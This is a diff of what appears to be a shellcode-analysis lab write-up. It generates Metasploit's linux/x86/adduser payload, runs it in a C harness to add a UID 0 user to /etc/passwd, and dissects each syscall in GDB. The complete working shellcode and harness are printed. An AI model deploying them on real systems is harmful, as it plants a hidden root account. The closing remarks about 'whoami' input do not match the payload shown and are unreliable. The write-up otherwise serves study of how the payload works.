@@ -1,303 +1,309 @@
-msfvenom  --list payloads |grep linux/x86/ 
+Lets take a look at the payload :  linux/x86/adduser
 
-toor@ubuntu:~/Desktop/slae/Assignments/5$ msfvenom -p linux/x86/adduser --list-options                                                              [12/1862]
-Options for payload/linux/x86/adduser:
-=========================
-
-
-       Name: Linux Add User
-     Module: payload/linux/x86/adduser
-   Platform: Linux
-       Arch: x86
-Needs Admin: Yes
- Total size: 97
-       Rank: Normal
-
-Provided by:
-    skape <mmiller@hick.org>
-    vlad902 <vlad902@gmail.com>
-    spoonm <spoonm@no$email.com>
-
-Basic options:
-Name   Current Setting  Required  Description
-----   ---------------  --------  -----------
-PASS   metasploit       yes       The password for this user
-SHELL  /bin/sh          no        The shell for this user
-USER   metasploit       yes       The username to create
-
-Description:
-  Create a new user with UID 0
-
-toor@ubuntu:~/Desktop/slae/Assignments/5$ msfvenom -p linux/x86/adduser USER=test PASS=test -f c
-[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: 91 bytes
-Final size of c file: 409 bytes
-unsigned char buf[] =
-"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
-"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
-"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65"
-"\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57"
-"\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
-"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
-"\x80";
-toor@ubuntu:~/Desktop/slae/Assignments/5$
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ msfvenom -p linux/x86/adduser --list-options                                                              [12/1862]
+   Options for payload/linux/x86/adduser:
+   =========================
 
 
-toor@ubuntu:~/Desktop/slae/Assignments/5$ cat shellcodetest.c
-#include<stdio.h>
-#include<string.h>
+          Name: Linux Add User
+      Module: payload/linux/x86/adduser
+      Platform: Linux
+        Arch: x86
+   Needs Admin: Yes
+   Total size: 97
+          Rank: Normal
 
-unsigned char code[] = \
-"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
-"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
-"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65"
-"\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57"
-"\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
-"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
-"\x80";
+   Provided by:
+       skape <mmiller@hick.org>
+      vlad902 <vlad902@gmail.com>
+      spoonm <spoonm@no$email.com>
 
-int main(void)
-{
+   Basic options:
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   PASS   metasploit       yes       The password for this user
+   SHELL  /bin/sh          no        The shell for this user
+   USER   metasploit       yes       The username to create
 
-        printf("shellcode length: %d\n",strlen(code));
-        (*(void(*)()) code)();
-}
-toor@ubuntu:~/Desktop/slae/Assignments/5$
+   Description:
+   Create a new user with UID 0
 
-toor@ubuntu:~/Desktop/slae/Assignments/5$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
-toor@ubuntu:~/Desktop/slae/Assignments/5$ sudo ./shellcode
-[sudo] password for toor:
-shellcode length: 40
-toor@ubuntu:~/Desktop/slae/Assignments/5$ cat /etc/passwd |grep test
-test:Az5Q6PpGwdKWc:0:0::/:/bin/sh
-toor@ubuntu:~/Desktop/slae/Assignments/5$
+From the options we could see that the payload requires two values the userid and password for the new user to be created ,lets try test : test
 
-#The sctest program from libemu2 can be used to emulate the specific instructions in the shellcode and help understand how the shellcode works.
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ msfvenom -p linux/x86/adduser USER=test PASS=test -f c
+   [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+   [-] No arch selected, selecting arch: x86 from the payload
+   No encoder or badchars specified, outputting raw payload
+   Payload size: 91 bytes
+   Final size of c file: 409 bytes
+   unsigned char buf[] =
+   "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
+   "\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
+   "\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65"
+   "\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57"
+   "\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
+   "\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
+   "\x80";
+   toor@ubuntu:~/Desktop/slae/Assignments/5$
 
+Okay We got the shellcode ,Lets see if it works by passing on to a c program
 
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ cat shellcodetest.c
+   #include<stdio.h>
+   #include<string.h>
 
-toor@ubuntu:~/Desktop/slae/Assignments/5$ sudo gdb -q ./shellcode                                                                                    [17/370]
-Reading symbols from /home/toor/Desktop/slae/Assignments/5/shellcode...(no debugging symbols found)...done.
-(gdb) break *&code
-Breakpoint 1 at 0x804a040
-(gdb) run
-Starting program: /home/toor/Desktop/slae/Assignments/5/shellcode
-shellcode length: 40
+   unsigned char code[] = \
+   "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
+   "\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
+   "\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65"
+   "\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57"
+   "\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
+   "\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
+   "\x80";
 
-Breakpoint 1, 0x0804a040 in code ()
-(gdb) set disassembly-flavor intel
-(gdb) disassemble
-Dump of assembler code for function code:
-=> 0x0804a040 <+0>:     xor    ecx,ecx
-   0x0804a042 <+2>:     mov    ebx,ecx
-   0x0804a044 <+4>:     push   0x46
-   0x0804a046 <+6>:     pop    eax
-   0x0804a047 <+7>:     int    0x80    1)
-   0x0804a049 <+9>:     push   0x5
-   0x0804a04b <+11>:    pop    eax
-   0x0804a04c <+12>:    xor    ecx,ecx
-   0x0804a04e <+14>:    push   ecx
-   0x0804a04f <+15>:    push   0x64777373
-   0x0804a054 <+20>:    push   0x61702f2f
-   0x0804a059 <+25>:    push   0x6374652f
-   0x0804a05e <+30>:    mov    ebx,esp
-   0x0804a060 <+32>:    inc    ecx
-   0x0804a061 <+33>:    mov    ch,0x4
-   0x0804a063 <+35>:    int    0x80    2)
-   0x0804a065 <+37>:    xchg   ebx,eax
-   0x0804a066 <+38>:    call   0x804a08d <code+77>
-   0x0804a06b <+43>:    je     0x804a0d2
-   0x0804a06d <+45>:    jae    0x804a0e3
-   0x0804a06f <+47>:    cmp    al,BYTE PTR [ecx+0x7a]
-   0x0804a072 <+50>:    xor    eax,0x70503651
-   0x0804a077 <+55>:    inc    edi
-   0x0804a078 <+56>:    ja     0x804a0de
-   0x0804a07a <+58>:    dec    ebx
-   0x0804a07b <+59>:    push   edi
-   0x0804a07c <+60>:    arpl   WORD PTR [edx],di
-   0x0804a07e <+62>:    xor    BYTE PTR [edx],bh
-   0x0804a080 <+64>:    xor    BYTE PTR [edx],bh
-   0x0804a082 <+66>:    cmp    ch,BYTE PTR [edi]
-   0x0804a084 <+68>:    cmp    ch,BYTE PTR [edi]
-   0x0804a086 <+70>:    bound  ebp,QWORD PTR [ecx+0x6e]
-   0x0804a089 <+73>:    das
-   0x0804a08a <+74>:    jae    0x804a0f4
-   0x0804a08c <+76>:    or     bl,BYTE PTR [ecx-0x75]
-   0x0804a08f <+79>:    push   ecx
-   0x0804a090 <+80>:    cld
-   0x0804a091 <+81>:    push   0x4
-   0x0804a093 <+83>:    pop    eax
-   0x0804a094 <+84>:    int    0x80          3)
-   0x0804a096 <+86>:    push   0x1
----Type <return> to continue, or q <return> to quit---
-   0x0804a098 <+88>:    pop    eax
-   0x0804a099 <+89>:    int    0x80           4)
-   0x0804a09b <+91>:    add    BYTE PTR [eax],al
-End of assembler dump.
+   int main(void)
+   {
 
-at This point i installed peda and see whats going on
+           printf("shellcode length: %d\n",strlen(code));
+           (*(void(*)()) code)();
+   }
+   toor@ubuntu:~/Desktop/slae/Assignments/5$
 
-4 syscalls
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ sudo ./shellcode
+   [sudo] password for toor:
+   shellcode length: 40
+
+Sudo is appended since it requires root privileges(user creation)
+
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ cat /etc/passwd |grep test
+   test:Az5Q6PpGwdKWc:0:0::/:/bin/sh
+   toor@ubuntu:~/Desktop/slae/Assignments/5$
+
+OKay we have a new user entry in /etc/passwd
+
+Lets peek under the hood by analysing the assembly,using GDB
+
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ sudo gdb -q ./shellcode                                                                                    [17/370]
+   Reading symbols from /home/toor/Desktop/slae/Assignments/5/shellcode...(no debugging symbols found)...done.
+   (gdb) break *&code
+   Breakpoint 1 at 0x804a040
+   (gdb) run
+   Starting program: /home/toor/Desktop/slae/Assignments/5/shellcode
+   shellcode length: 40
+
+   Breakpoint 1, 0x0804a040 in code ()
+   (gdb) set disassembly-flavor intel
+   (gdb) disassemble
+   Dump of assembler code for function code:
+   => 0x0804a040 <+0>:     xor    ecx,ecx
+      0x0804a042 <+2>:     mov    ebx,ecx
+      0x0804a044 <+4>:     push   0x46
+      0x0804a046 <+6>:     pop    eax
+      0x0804a047 <+7>:     int    0x80                      1)
+      0x0804a049 <+9>:     push   0x5
+      0x0804a04b <+11>:    pop    eax
+      0x0804a04c <+12>:    xor    ecx,ecx
+      0x0804a04e <+14>:    push   ecx
+      0x0804a04f <+15>:    push   0x64777373
+      0x0804a054 <+20>:    push   0x61702f2f
+      0x0804a059 <+25>:    push   0x6374652f
+      0x0804a05e <+30>:    mov    ebx,esp
+      0x0804a060 <+32>:    inc    ecx
+      0x0804a061 <+33>:    mov    ch,0x4
+      0x0804a063 <+35>:    int    0x80                      2)
+      0x0804a065 <+37>:    xchg   ebx,eax
+      0x0804a066 <+38>:    call   0x804a08d <code+77>
+      0x0804a06b <+43>:    je     0x804a0d2
+      0x0804a06d <+45>:    jae    0x804a0e3
+      0x0804a06f <+47>:    cmp    al,BYTE PTR [ecx+0x7a]
+      0x0804a072 <+50>:    xor    eax,0x70503651
+      0x0804a077 <+55>:    inc    edi
+      0x0804a078 <+56>:    ja     0x804a0de
+      0x0804a07a <+58>:    dec    ebx
+      0x0804a07b <+59>:    push   edi
+      0x0804a07c <+60>:    arpl   WORD PTR [edx],di
+      0x0804a07e <+62>:    xor    BYTE PTR [edx],bh
+      0x0804a080 <+64>:    xor    BYTE PTR [edx],bh
+      0x0804a082 <+66>:    cmp    ch,BYTE PTR [edi]
+      0x0804a084 <+68>:    cmp    ch,BYTE PTR [edi]
+      0x0804a086 <+70>:    bound  ebp,QWORD PTR [ecx+0x6e]
+      0x0804a089 <+73>:    das
+      0x0804a08a <+74>:    jae    0x804a0f4
+      0x0804a08c <+76>:    or     bl,BYTE PTR [ecx-0x75]
+      0x0804a08f <+79>:    push   ecx
+      0x0804a090 <+80>:    cld
+      0x0804a091 <+81>:    push   0x4
+      0x0804a093 <+83>:    pop    eax
+      0x0804a094 <+84>:    int    0x80                          3)
+      0x0804a096 <+86>:    push   0x1
+      ---Type <return> to continue, or q <return> to quit---
+      0x0804a098 <+88>:    pop    eax
+      0x0804a099 <+89>:    int    0x80                         4)
+      0x0804a09b <+91>:    add    BYTE PTR [eax],al
+   End of assembler dump.
+
+We could identify 4 syscalls. Lets set up a breakpoint at each location and see whats going on
 
 SYSCALL NUMBER 1
 
-break *0x0804a040
-c
+   break *0x0804a040 
+   c
 
+   => 0x0804a040 <+0>:     xor    ecx,ecx
+      0x0804a042 <+2>:     mov    ebx,ecx
+      0x0804a044 <+4>:     push   0x46
+      0x0804a046 <+6>:     pop    eax
+      0x0804a047 <+7>:     int    0x80
 
+   break *0x0804a040
+   c
 
-=> 0x0804a040 <+0>:     xor    ecx,ecx
-   0x0804a042 <+2>:     mov    ebx,ecx
-   0x0804a044 <+4>:     push   0x46
-   0x0804a046 <+6>:     pop    eax
-   0x0804a047 <+7>:     int    0x80
-
-break *0x0804a040
-c
-
-   [----------------------------------registers-----------------------------------]
-EAX: 0x46 ('F')
-EBX: 0x0
-ECX: 0x0
-EDX: 0x0
-ESI: 0x0
-EDI: 0x804a069 --> 0x65740000 ('')
-EBP: 0xbffff778 --> 0x0
-ESP: 0xbffff74c --> 0x8048429 (<main+69>:       mov    edi,DWORD PTR [ebp-0x4])
-EIP: 0x804a047 --> 0x56a80cd
-EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
+      [----------------------------------registers-----------------------------------]
+   EAX: 0x46 ('F')
+   EBX: 0x0
+   ECX: 0x0
+   EDX: 0x0
+   ESI: 0x0
+   EDI: 0x804a069 --> 0x65740000 ('')
+   EBP: 0xbffff778 --> 0x0
+   ESP: 0xbffff74c --> 0x8048429 (<main+69>:       mov    edi,DWORD PTR [ebp-0x4])
+   EIP: 0x804a047 --> 0x56a80cd
+   EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+   [-------------------------------------code-------------------------------------]
    0x804a042 <code+2>:  mov    ebx,ecx
    0x804a044 <code+4>:  push   0x46
    0x804a046 <code+6>:  pop    eax
-=> 0x804a047 <code+7>:  int    0x80
+ =>0x804a047 <code+7>:  int    0x80
    0x804a049 <code+9>:  push   0x5
    0x804a04b <code+11>: pop    eax
    0x804a04c <code+12>: xor    ecx,ecx
    0x804a04e <code+14>: push   ecx
 
-eax = syscallnumber 0x46 ie 70 in decimal
+EAX = syscallnumber 0x46 ie 70 in decimal
 
-toor@ubuntu:~/Desktop/slae/Assignments/5$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 70
-#define __NR_setreuid            70
-#define __NR_setresgid          170
-#define __NR_tgkill             270
-toor@ubuntu:~/Desktop/slae/Assignments/5$ man 2 setreuid
-The setreuid function is called so the program executes as root
-setreuid() sets real and effective user IDs of the calling process.
-int setreuid(uid_t ruid, uid_t euid);
-comes down to
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 70
+   #define __NR_setreuid            70
+   #define __NR_setresgid          170
+   #define __NR_tgkill             270
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ man 2 setreuid
+   
+   The setreuid function is called so the program executes as root
+   setreuid() sets real and effective user IDs of the calling process.
+   int setreuid(uid_t ruid, uid_t euid);
+   This comes down to
 
-setreuid(0,0)
+   setreuid(0,0)
 
-takes 2 prameters
-ebx and  ecx  values zero , hence the real and effective user id is set to 0 , root process
+   takes 2 prameters
+EBX and ECX  values zero , hence the real and effective user id is set to 0 , root process
 
 SYSCALL NUMBER 2
 
-break *0x0804a063
-c
+   break *0x0804a063
+   c
 
-[----------------------------------registers-----------------------------------]
-EAX: 0x5
-EBX: 0xbffff73c ("/etc//passwd")
-ECX: 0x401
-EDX: 0x0
-ESI: 0x0
-EDI: 0x804a069 --> 0x65740000 ('')
-EBP: 0xbffff778 --> 0x0
-ESP: 0xbffff73c ("/etc//passwd")
-EIP: 0x804a063 --> 0xe89380cd
-EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x804a05e <code+30>: mov    ebx,esp
-   0x804a060 <code+32>: inc    ecx
-   0x804a061 <code+33>: mov    ch,0x4
-=> 0x804a063 <code+35>: int    0x80
-
-
-eax 0x5  ie decimal 5
-toor@ubuntu:~/Desktop/slae/Assignments/5$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 5
-#define __NR_open                 5
-
-open, creat - open and possibly create a file or device
-
-man 2 open
-int open(const char *pathname, int flags, mode_t mode);
-
-gdb-peda$ x/12xb 0xbffff73c
-0xbffff73c:     0x2f    0x65    0x74    0x63    0x2f    0x2f    0x70    0x61
-0xbffff744:     0x73    0x73    0x77    0x64
-
->>> "2f6574632f2f706173737764".decode("hex")
-'/etc//passwd'
-
-mode, ECX 0x401 convert to octal we  get 2001
+   [----------------------------------registers-----------------------------------]
+   EAX: 0x5
+   EBX: 0xbffff73c ("/etc//passwd")
+   ECX: 0x401
+   EDX: 0x0
+   ESI: 0x0
+   EDI: 0x804a069 --> 0x65740000 ('')
+   EBP: 0xbffff778 --> 0x0
+   ESP: 0xbffff73c ("/etc//passwd")
+   EIP: 0x804a063 --> 0xe89380cd
+   EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+   [-------------------------------------code-------------------------------------]
+    0x804a05e <code+30>: mov    ebx,esp
+    0x804a060 <code+32>: inc    ecx
+    0x804a061 <code+33>: mov    ch,0x4
+ => 0x804a063 <code+35>: int    0x80
 
 
+EAX comtains 0x5  ie decimal 5
+   toor@ubuntu:~/Desktop/slae/Assignments/5$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 5
+   #define __NR_open                 5
 
-https://raw.githubusercontent.com/torvalds/linux/master/include/uapi/asm-generic/fcntl.h
-from fcnt1.h
-#define O_WRONLY	00000001
-#define O_APPEND	00002000
-Therefore the O_WRONLY and O_APPEND flags are used on /etc/passwd.
+   open, creat - open and possibly create a file or device
 
-the file descriptter fd will be on eax and here it will be saved on ebx using the next instruction
-0x0804a065 <+37>:    xchg   ebx,eax
+   man 2 open
+   int open(const char *pathname, int flags);
+
+
+   gdb-peda$ x/12xb 0xbffff73c
+   0xbffff73c:     0x2f    0x65    0x74    0x63    0x2f    0x2f    0x70    0x61
+   0xbffff744:     0x73    0x73    0x77    0x64
+
+   >>> "2f6574632f2f706173737764".decode("hex")
+   '/etc//passwd'
+
+
+#etc / is added to make the string length a multiple of 4 bytes
+
+ECX contains 0x401 convert to octal we  get 2001
+
+From,   https://raw.githubusercontent.com/torvalds/linux/master/include/uapi/asm-generic/fcntl.h
+   from fcnt1.h
+   #define O_WRONLY	00000001
+   #define O_APPEND	00002000
+
+   Therefore the O_WRONLY and O_APPEND flags are used on /etc/passwd.
+
+The file descriptter fd will be on eax and here it will be saved on ebx using the next instruction
+   0x0804a065 <+37>:    xchg   ebx,eax
 
 
 SYSCALL NUMBER 3
 
-----------------------------------------------------------------------------------------
-   0x0804a065 <+37>:    xchg   ebx,eax
-   0x0804a066 <+38>:    call   0x804a08d <code+77>
-   0x0804a06b <+43>:    je     0x804a0d2
-   0x0804a06d <+45>:    jae    0x804a0e3
-   0x0804a06f <+47>:    cmp    al,BYTE PTR [ecx+0x7a]
-   0x0804a072 <+50>:    xor    eax,0x70503651
-   0x0804a077 <+55>:    inc    edi
-   0x0804a078 <+56>:    ja     0x804a0de
-   0x0804a07a <+58>:    dec    ebx
-   0x0804a07b <+59>:    push   edi
-   0x0804a07c <+60>:    arpl   WORD PTR [edx],di
-   0x0804a07e <+62>:    xor    BYTE PTR [edx],bh
-   0x0804a080 <+64>:    xor    BYTE PTR [edx],bh
-   0x0804a082 <+66>:    cmp    ch,BYTE PTR [edi]
-   0x0804a084 <+68>:    cmp    ch,BYTE PTR [edi]
-   0x0804a086 <+70>:    bound  ebp,QWORD PTR [ecx+0x6e]
-   0x0804a089 <+73>:    das
-   0x0804a08a <+74>:    jae    0x804a0f4
-   0x0804a08c <+76>:    or     bl,BYTE PTR [ecx-0x75]
-   0x0804a08f <+79>:    push   ecx
-   0x0804a090 <+80>:    cld
-   0x0804a091 <+81>:    push   0x4
-   0x0804a093 <+83>:    pop    eax
-   0x0804a094 <+84>:    int    0x80 
+   ----------------------------------------------------------------------------------------
+      0x0804a065 <+37>:    xchg   ebx,eax
+      0x0804a066 <+38>:    call   0x804a08d <code+77>
+      0x0804a06b <+43>:    je     0x804a0d2
+      0x0804a06d <+45>:    jae    0x804a0e3
+      0x0804a06f <+47>:    cmp    al,BYTE PTR [ecx+0x7a]
+      0x0804a072 <+50>:    xor    eax,0x70503651
+      0x0804a077 <+55>:    inc    edi
+      0x0804a078 <+56>:    ja     0x804a0de
+      0x0804a07a <+58>:    dec    ebx
+      0x0804a07b <+59>:    push   edi
+      0x0804a07c <+60>:    arpl   WORD PTR [edx],di
+      0x0804a07e <+62>:    xor    BYTE PTR [edx],bh
+      0x0804a080 <+64>:    xor    BYTE PTR [edx],bh
+      0x0804a082 <+66>:    cmp    ch,BYTE PTR [edi]
+      0x0804a084 <+68>:    cmp    ch,BYTE PTR [edi]
+      0x0804a086 <+70>:    bound  ebp,QWORD PTR [ecx+0x6e]
+      0x0804a089 <+73>:    das
+      0x0804a08a <+74>:    jae    0x804a0f4
+      0x0804a08c <+76>:    or     bl,BYTE PTR [ecx-0x75]
+      0x0804a08f <+79>:    push   ecx
+      0x0804a090 <+80>:    cld
+      0x0804a091 <+81>:    push   0x4
+      0x0804a093 <+83>:    pop    eax
+      0x0804a094 <+84>:    int    0x80 
 
-before moving to syscall ,lets see whats happening here ..we see the file descriptor is getting exchanged to ebx , then there is a function call happening.lets break there 
+Before moving to syscall ,lets see whats happening here ..we see the file descriptor is getting exchanged to ebx , then there is a function call happening.lets break there 
 the address of the next instrution is saved on the stack
 
 
 break *0x804a066
 c
 
-EAX: 0xbffff73c ("/etc//passwd")
-EBX: 0x7
-ECX: 0x401
-EDX: 0x0
-ESI: 0x0
-EDI: 0x804a069 --> 0x65740000 ('')
-EBP: 0xbffff778 --> 0x0
-ESP: 0xbffff738 --> 0x804a06b ("test:Az5Q6PpGwdKWc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
-EIP: 0x804a08d --> 0xfc518b59
-EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-=> 0x804a08d <code+77>: pop    ecx
-   0x804a08e <code+78>: mov    edx,DWORD PTR [ecx-0x4]
-   0x804a091 <code+81>: push   0x4
-   0x804a093 <code+83>: pop    eax
+   EAX: 0xbffff73c ("/etc//passwd")
+   EBX: 0x7
+   ECX: 0x401
+   EDX: 0x0
+   ESI: 0x0
+   EDI: 0x804a069 --> 0x65740000 ('')
+   EBP: 0xbffff778 --> 0x0
+   ESP: 0xbffff738 --> 0x804a06b ("test:Az5Q6PpGwdKWc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
+   EIP: 0x804a08d --> 0xfc518b59
+   EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+   [-------------------------------------code-------------------------------------]
+   => 0x804a08d <code+77>: pop    ecx
+      0x804a08e <code+78>: mov    edx,DWORD PTR [ecx-0x4]
+      0x804a091 <code+81>: push   0x4
+      0x804a093 <code+83>: pop    eax
 
 
 we see the /etc/passwd entry location is poped on to ecx
@@ -305,54 +311,56 @@ length of the string is copied on to edx
 
 lets see what happens at the syscall location
 
-
 break *0x0804a094
 c
 
-[----------------------------------registers-----------------------------------]
-EAX: 0x4
-EBX: 0x7
-ECX: 0x804a06b ("test:Az5Q6PpGwdKWc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
-EDX: 0x22 ('"')
-ESI: 0x0
-EDI: 0x804a069 --> 0x65740000 ('')
-EBP: 0xbffff778 --> 0x0
-ESP: 0xbffff73c ("/etc//passwd")
-EIP: 0x804a094 --> 0x16a80cd
-EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x804a090 <code+80>: cld
-   0x804a091 <code+81>: push   0x4
-   0x804a093 <code+83>: pop    eax
-=> 0x804a094 <code+84>: int    0x80
+   [----------------------------------registers-----------------------------------]
+   EAX: 0x4
+   EBX: 0x7
+   ECX: 0x804a06b ("test:Az5Q6PpGwdKWc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")
+   EDX: 0x22 ('"')
+   ESI: 0x0
+   EDI: 0x804a069 --> 0x65740000 ('')
+   EBP: 0xbffff778 --> 0x0
+   ESP: 0xbffff73c ("/etc//passwd")
+   EIP: 0x804a094 --> 0x16a80cd
+   EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+   [-------------------------------------code-------------------------------------]
+    0x804a090 <code+80>: cld
+    0x804a091 <code+81>: push   0x4
+    0x804a093 <code+83>: pop    eax
+  =>0x804a094 <code+84>: int    0x80
 
-eax ,0x4 ie 4 
-toor@ubuntu:/usr/include/i386-linux-gnu/sys$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 4
-#define __NR_write                4
+EAX ,0x4 ie 4 
+   toor@ubuntu:/usr/include/i386-linux-gnu/sys$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 4
+   #define __NR_write                4
 
-man 2 write
-write(int fd, const void *buf, size_t count);
+   man 2 write
+   write(int fd, const void *buf, size_t count);
 
 
+   file descriptor value ebx 
+   string buffer address is contained by ecx
+   The length of the string is saved in edx
 
-file descriptor value ebx 
-string buffer address is contained by ecx
-the length of the string is saved in edx
-
-write "test:Az5Q6PpGwdKWc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀" on to /etc/passwd file
+   write "test:Az5Q6PpGwdKWc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀" on to /etc/passwd file
 
 
 SYS CALL 4
+
+
+
    0x0804a096 <+86>:    push   0x1
    0x0804a098 <+88>:    pop    eax
    0x0804a099 <+89>:    int    0x80
 
 exit call
 
-eax contains the sys call number 1
+EAX contains the sys call number 1
 
 
 In Short
+
 Dump of assembler code for function code:                                                                                                            [4/1896]
 => 0x0804a040 <+0>:     xor    ecx,ecx  ;clear ecx register
    0x0804a042 <+2>:     mov    ebx,ecx  :clear ebx register
@@ -402,8 +410,8 @@ End of assembler dump.
 
 
 --------------------
-inc    ecx
-mov    ch,0x4
+   inc    ecx
+   mov    ch,0x4
 
     A    X         |    CH   | CL       
 0000 0000 0000 0000 0000 0000 0000 0001
@@ -411,5 +419,10 @@ mov    ch,0x4
 0000 0000 0000 0000 0000 0100 0000 0001
 
 
-x/4xb 0x804A067
-0x804a067 <code+39>:    0x22    0x00    0x00    0x00
+User input passing , Lets see the opcode as well using ndiasm
+
+  toor@ubuntu:/usr/include/i386-linux-gnu/sys$ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x74\x65\x73\x74\x3a\x41\x7a\x35\x51\x36\x50\x70\x47\x77\x64\x4b\x57\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
+
+
+We have identified that in msfvenom ,  
+Analysing the opcode we can see that they are using CALL-JMP_POP format to put the userinput "whoami" onto the stack. user input "whoam" is passed using call dword 0x24
